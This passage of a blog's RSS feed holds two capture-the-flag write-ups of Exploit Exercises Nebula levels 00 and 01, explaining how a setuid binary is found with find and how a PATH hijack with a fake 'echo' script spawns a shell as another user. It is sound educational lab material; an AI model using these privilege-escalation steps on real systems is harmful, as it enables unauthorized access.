+<p>I wasn&#8217;t familiar with the env command so used a bit of googling until I learned that env is used to launch programs in a different environment. It also also sometimes used because a script needs to start with a shebang and followed by an interpreter directive, which must be an absolute path. Because some interpreters are not always installed at the same location, env is sometimes used to launch the correct interpreter by file name rather than full path (e.g. <strong>#!/usr/bin/env/ python</strong>). To do this, env searches through the list of paths in in the environment variable $PATH in order until it finds a correctly named file that it can execute in one of them. Presumably (for some unknown reason) env is being used here to invoke echo, but it means we can make a different echo program run by creating a malicious script and changing $PATH to point to it first.</p>
+<p>I changed the path to include /tmp at the beginning by running the follwing command:</p>
+<pre lang="Bash">PATH=/tmp:$PATH</pre>
+<p>and then created a new symbolic link called echo to the getflag program:</p>
+<pre lang="Bash">ln -s /bin/getflag /tmp/echo</pre>
+<p>Now when I ran the vulnerable program I got a success message, but I wanted to go one further. I wanted shell&#8230;</p>
+<p>I tried creating a symbolic link to bash, but now running flag01 failed due to the invalid arguments (&#8220;and now what?&#8221; are valid arguments for echo, but not bash), so I removed the symbolic link and created an executable shell script that ignored all arguments, and saved it as echo in /tmp. It contained the following two lines of code:</p>
+<pre lang="Bash" line="1">
+#!/bin/bash
+/bin/bash
+</pre>
+<p>This, I hoped, would cause the vulnerable program to spawn a shell. I tested it and it worked. I then ran <strong>whoami</strong> to confirm that I was flag01 and then <strong>getflag</strong> to get a success message.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/exploit-exercises-nebula-level-01/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Exploit Exercises &#8211; Nebula &#8211; Level 00</title>
+		<link>/exploit-exercises-nebula-level-00/</link>
+					<comments>/exploit-exercises-nebula-level-00/#comments</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Wed, 28 Nov 2012 13:42:15 +0000</pubDate>
+				<category><![CDATA[Exploit]]></category>
+		<category><![CDATA[Exploit Excercises]]></category>
+		<category><![CDATA[Information Security]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Penetration Test]]></category>
+		<category><![CDATA[Shell]]></category>
+		<category><![CDATA[Unix]]></category>
+		<guid isPermaLink="false">/?p=143</guid>
+
+					<description><![CDATA[I&#8217;ve started to have a look at the challenges offered by exploit-exercises.com and thought I&#8217;d document my progress. This post is about Nebula Level 00. The information about this level says: This level requires you to find a Set User ID program that will run &#8230; <a href="/exploit-exercises-nebula-level-00/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>I&#8217;ve started to have a look at the challenges offered by <a title="Exploit Exercises" href="http://exploit-exercises.com/" target="_blank">exploit-exercises.com</a> and thought I&#8217;d document my progress.</p>
+<p>This post is about <a title="Nebula Level 00" href="http://exploit-exercises.com/nebula/level00" target="_blank">Nebula Level 00</a>. The information about this level says:</p>
+<p style="padding-left: 30px;">This level requires you to find a Set User ID program that will run as the &#8220;flag00&#8221; account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.<br />
+Alternatively, look at the find man page.<br />
+To access this level, log in as level00 with the password of level00 .</p>
+<p>This is a pretty simple challenge, but did mean I had to learn all about normal unix filesystem permissions and the more advanced setuid/setguid/stickybit permissions I also learned how to suppress errors from the find command and how to better use the find and man command.</p>
+<p>The command I used was</p>
+<pre lang="C">find / -perm -u=s 2>/dev/null</pre>
+<p>I&#8217;ll break down what this does:</p>
+<ul>
+<li><strong>find</strong> &#8211; search for files in a directory hierarchy</li>
+<li><strong>/</strong> &#8211; start at the root of the filesystem</li>
+<li><strong>-perm -u=s</strong> &#8211; find files that have the setuid bit set in their permissions</li>
+<li><strong>2&gt;/dev/null</strong> &#8211; discard all errors (mostly about not having permission to scan directories)</li>
+</ul>
+<p>One of the results was <strong>/bin/&#8230;/flag00</strong>. This (<strong>&#8230;\</strong>) is a suspicious looking directory! Running <strong>ll /bin/&#8230;/flag00</strong> showed me that the owner was flag00 and the setuid bit was indeed set so I ran the file which told me to now run getflag then changed the user to flag00. Running <strong>getflag</strong> gave me a success message.</p>
+<p>What I liked about this was that I had a shell running as the flag00 user so I could run other commands like <strong>whoami</strong> before typing <strong>exit</strong> to get out of the shell. At the time, I had no idea how I was put into a new shell, but it all becomes clearer in the next level&#8230;</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/exploit-exercises-nebula-level-00/feed/</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
